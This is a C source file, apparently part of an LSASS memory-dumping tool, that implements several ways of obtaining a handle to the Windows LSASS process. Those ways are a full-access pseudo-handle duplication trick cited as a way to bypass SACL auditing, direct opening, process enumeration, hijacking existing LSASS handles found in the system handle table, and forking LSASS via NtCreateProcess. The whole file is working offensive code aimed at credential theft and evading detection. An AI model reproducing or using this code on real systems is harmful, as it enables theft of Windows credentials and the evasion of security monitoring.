#include "handle.h"
#include "modules.h"
#include "malseclogon.h"

#if defined(NANO) && !defined(SSP)

/*
 * "The DuplicateHandle system call has an interesting behaviour
 * when using the pseudo current process handle, which has the value -1.
 * Specifically if you try and duplicate the pseudo handle from another
 * process you get back a full access handle to the source process."
 * https://www.tiraniddo.dev/2017/10/bypassing-sacl-auditing-on-lsass.html
 */
HANDLE make_handle_full_access(HANDLE hProcess)
{
	if (!hProcess)
		return NULL;

	HANDLE hDuped = NULL;
	NTSTATUS status = NtDuplicateObject(hProcess, (HANDLE)-1, NtCurrentProcess(), &hDuped, 0, 0, DUPLICATE_SAME_ACCESS);

	NtClose(hProcess); hProcess = NULL;
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtDuplicateObject", status);
		DPRINT_ERR("Could not convert the handle to full access privileges");
		return NULL;
	}

	DPRINT("The handle now has full access privileges");
	return hDuped;
}

// get a handle to LSASS via multiple methods
HANDLE obtain_lsass_handle(DWORD lsass_pid, DWORD permissions, BOOL dup, BOOL fork, BOOL is_malseclogon_stage_2, LPCSTR dump_path)
{
	HANDLE hProcess = NULL;

	if (is_malseclogon_stage_2)
	{
		// this is always done from an EXE
#ifdef EXE
		hProcess = malseclogon_stage_2(dump_path);
#endif
	}
	else if (dup)
	{
		DPRINT("Trying to find an existing " LSASS " handle to duplicate");
		hProcess = duplicate_lsass_handle(lsass_pid, permissions);
	}
	else if (lsass_pid)
	{
		DPRINT("Using NtOpenProcess to get a handle to " LSASS);
		hProcess = get_process_handle(lsass_pid, permissions, FALSE);
	}
	else
	{
		// the variable lsass_pid should always be set
		// this branch won't be called
		DPRINT("Using NtGetNextProcess to get a handle to " LSASS);
		hProcess = find_lsass(permissions);
	}

	if (hProcess)
	{
		DPRINT(LSASS " handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
	}

	return hProcess;
}

HANDLE find_lsass(DWORD dwFlags)
{
	HANDLE hProcess = NULL;
	while (TRUE)
	{
		NTSTATUS status = NtGetNextProcess(hProcess, dwFlags, 0, 0, &hProcess);
		if (status == STATUS_NO_MORE_ENTRIES)
		{
			PRINT_ERR("The " LSASS " process was not found. Are you elevated?");
			return NULL;
		}

		if (!NT_SUCCESS(status))
		{
			syscall_failed("NtGetNextProcess", status);
			DPRINT_ERR("Could not find the " LSASS " process");
			return NULL;
		}

		if (is_lsass(hProcess))
			return hProcess;
	}
}

HANDLE get_process_handle(DWORD dwPid, DWORD dwFlags, BOOL quiet)
{
	NTSTATUS status;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

	CLIENT_ID uPid = { 0 };
	uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
	uPid.UniqueThread = (HANDLE)0;

	status = NtOpenProcess(&hProcess, dwFlags, &ObjectAttributes, &uPid);
	if (status == STATUS_INVALID_CID)
	{
		if (!quiet)
		{
			PRINT_ERR("There is no process with the PID %ld.", dwPid);
		}
		return NULL;
	}

	if (status == STATUS_ACCESS_DENIED)
	{
		if (!quiet)
		{
			PRINT_ERR("Could not open a handle to %ld. Are you elevated?", dwPid);
		}
		return NULL;
	}
	else if (!NT_SUCCESS(status))
	{
		syscall_failed("NtOpenProcess", status);
		DPRINT_ERR("Could not open handle to process %ld", dwPid);
		return NULL;
	}

	return hProcess;
}

PSYSTEM_HANDLE_INFORMATION get_all_handles()
{
	NTSTATUS status;
	ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);

	PVOID handleTableInformation = intAlloc(buffer_size);
	if (!handleTableInformation)
	{
		malloc_failed();
		DPRINT_ERR("Could not get all handles");
		return NULL;
	}

	while (TRUE)
	{
		status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, buffer_size, &buffer_size);
		if (status == STATUS_INFO_LENGTH_MISMATCH)
		{
			// the buffer was too small, buffer_size now has the new length
			intFree(handleTableInformation);
			handleTableInformation = NULL;
			handleTableInformation = intAlloc(buffer_size);
			if (!handleTableInformation)
			{
				malloc_failed();
				DPRINT_ERR("Could not get all handles");
				return NULL;
			}
			continue;
		}

		if (!NT_SUCCESS(status))
		{
			syscall_failed("NtQuerySystemInformation", status);
			DPRINT_ERR("Could not get all handles");
			intFree(handleTableInformation);
			handleTableInformation = NULL;
			return NULL;
		}

		DPRINT("Obtained the handle table");
		return handleTableInformation;
	}
}

BOOL process_is_included(PPROCESS_LIST process_list, ULONG ProcessId)
{
	for (ULONG i = 0; i < process_list->Count; i++)
	{
		if (process_list->ProcessId[i] == ProcessId)
			return TRUE;
	}
	return FALSE;
}

PPROCESS_LIST get_processes_from_handle_table(PSYSTEM_HANDLE_INFORMATION handleTableInformation)
{
	PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
	if (!process_list)
	{
		malloc_failed();
		DPRINT_ERR("Could not get the processes from the handle table");
		return NULL;
	}

	PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
	for (ULONG i = 0; i < handleTableInformation->Count; i++)
	{
		handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];

		if (!process_is_included(process_list, handleInfo->UniqueProcessId))
		{
			if (process_list->Count + 1 > MAX_PROCESSES)
			{
				PRINT_ERR("Too many processes, please increase MAX_PROCESSES");
				intFree(process_list); process_list = NULL;
				return NULL;
			}

			process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
		}
	}

	DPRINT("Enumerated %ld handles from %ld processes", handleTableInformation->Count, process_list->Count);
	return process_list;
}

POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
{
	NTSTATUS status;
	ULONG BufferLength = 0x1000;
	POBJECT_TYPES_INFORMATION obj_type_information;

	do
	{
		obj_type_information = intAlloc(BufferLength);
		if (!obj_type_information)
		{
			malloc_failed();
			DPRINT_ERR("Could not obtain the different types of objects");
			return NULL;
		}

		status = NtQueryObject(NULL, ObjectTypesInformation, obj_type_information, BufferLength, &BufferLength);
		if (NT_SUCCESS(status))
		{
			DPRINT("Obtained the different types of objects");
			return obj_type_information;
		}

		intFree(obj_type_information);
		obj_type_information = NULL;
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	syscall_failed("NtQueryObject", status);
	DPRINT_ERR("Could not obtain the different types of objects");
	return NULL;
}

BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
{
	POBJECT_TYPES_INFORMATION ObjectTypes;
	POBJECT_TYPE_INFORMATION_V2 CurrentType;

	ObjectTypes = QueryObjectTypesInfo();
	if (!ObjectTypes)
	{
		DPRINT_ERR("Could not find the index of type 'Process'");
		return FALSE;
	}

	CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
	for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
	{
		if (!_wcsicmp(CurrentType->TypeName.Buffer, PROCESS_TYPE))
		{
			*ProcesTypeIndex = i + 2;
			DPRINT("Found the index of type 'Process': %ld", i + 2);
			return TRUE;
		}
		CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
	}

	DPRINT_ERR("Index of type 'Process' not found");
	return FALSE;
}

HANDLE duplicate_lsass_handle(DWORD lsass_pid, DWORD permissions)
{
	NTSTATUS status;
	BOOL success;

	ULONG ProcesTypeIndex = 0;
	success = GetTypeIndexByName(&ProcesTypeIndex);
	if (!success)
		return NULL;

	PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
	if (!handleTableInformation)
		return NULL;

	PPROCESS_LIST process_list = get_processes_from_handle_table(handleTableInformation);
	if (!process_list)
	{
		intFree(handleTableInformation);
		handleTableInformation = NULL;
		return NULL;
	}

	DWORD local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);

	// loop over each ProcessId
	for (ULONG i = 0; i < process_list->Count; i++)
	{
		ULONG ProcessId = process_list->ProcessId[i];

		if (ProcessId == local_pid)
			continue;
		if (ProcessId == lsass_pid)
			continue;
		if (ProcessId == 0)
			continue;
		if (ProcessId == 4)
			continue;

		// we will open a handle to this ProcessId later on
		HANDLE hProcess = NULL;

		// loop over each handle of this ProcessId
		for (ULONG j = 0; j < handleTableInformation->Count; j++)
		{
			PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

			// make sure this handle is from the current ProcessId
			if (handleInfo->UniqueProcessId != ProcessId)
				continue;

			// make sure the handle has the permissions we need
			if ((handleInfo->GrantedAccess & (permissions)) != (permissions))
				continue;

			// make sure the handle is of type 'Process'
			if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
				continue;

			if (!hProcess)
			{
				// open a handle to the process with PROCESS_DUP_HANDLE
				hProcess = get_process_handle(ProcessId, PROCESS_DUP_HANDLE, TRUE);
				if (!hProcess)
					break;
			}

			// duplicate the handle
			HANDLE hDuped = NULL;
			status = NtDuplicateObject(hProcess, (HANDLE)(DWORD_PTR)handleInfo->HandleValue, NtCurrentProcess(), &hDuped, 0, 0, DUPLICATE_SAME_ACCESS);
			if (!NT_SUCCESS(status))
				continue;

			if (is_lsass(hDuped))
			{
				// found LSASS handle
				DPRINT("Found " LSASS " handle: 0x%x, on process: %d", handleInfo->HandleValue, handleInfo->UniqueProcessId);
				intFree(handleTableInformation);
				handleTableInformation = NULL;
				intFree(process_list);
				process_list = NULL;
				NtClose(hProcess);
				hProcess = NULL;
				return hDuped;
			}

			NtClose(hDuped);
			hDuped = NULL;
		}

		if (hProcess)
		{
			NtClose(hProcess);
			hProcess = NULL;
		}
	}

	PRINT_ERR("No handle to the " LSASS " process was found");

	intFree(handleTableInformation);
	handleTableInformation = NULL;
	intFree(process_list);
	process_list = NULL;
	return NULL;
}

HANDLE fork_process(DWORD dwPid, HANDLE hProcess)
{
	// this function can be call with a PID or an existing handle
	if (!dwPid && !hProcess)
		return NULL;

	if (dwPid && !hProcess)
	{
		// called with a PID, open handle to LSASS with PROCESS_CREATE_PROCESS
		hProcess = get_process_handle(dwPid, PROCESS_CREATE_PROCESS, FALSE);
		if (!hProcess)
		{
			DPRINT_ERR("Could not fork " LSASS);
			return NULL;
		}
	}

#define OBJ_CASE_INSENSITIVE                0x00000040L

	// fork the LSASS process
	HANDLE hCloneProcess = NULL;
	OBJECT_ATTRIBUTES CloneObjectAttributes;
	InitializeObjectAttributes(&CloneObjectAttributes, NULL, OBJ_CASE_INSENSITIVE, NULL, NULL);

	NTSTATUS status = NtCreateProcess(&hCloneProcess, GENERIC_ALL, &CloneObjectAttributes, hProcess, TRUE, NULL, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		syscall_failed("NtCreateProcess", status);
		DPRINT_ERR("Could not fork " LSASS);
		hCloneProcess = NULL;
	}
	else
	{
		DPRINT("Forked the " LSASS " process, new handle: 0x%lx", (DWORD)(ULONG_PTR)hCloneProcess);
	}

	NtClose(hProcess); hProcess = NULL;
	return hCloneProcess;
}
#endif